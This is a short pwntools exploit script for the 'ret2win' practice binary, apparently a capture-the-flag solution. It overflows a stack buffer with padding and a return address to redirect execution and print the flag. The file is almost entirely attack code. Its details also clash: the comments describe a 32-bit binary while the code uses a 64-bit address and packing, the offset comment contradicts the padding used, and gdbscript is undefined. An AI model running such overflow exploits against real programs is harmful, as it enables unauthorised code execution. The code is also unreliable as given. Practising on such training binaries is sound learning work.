#!/usr/bin/env python
from pwn import *
exe = context.binary = ELF('ret2win')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
ret2win_address = 0x400756

io = start()
buf = ""
buf += "A"*40 # offset on 64bits is 44
buf += p64(ret2win_address)

io.recvuntil('>')
io.sendline(buf)
log.success("flag: %s " %io.recvall())
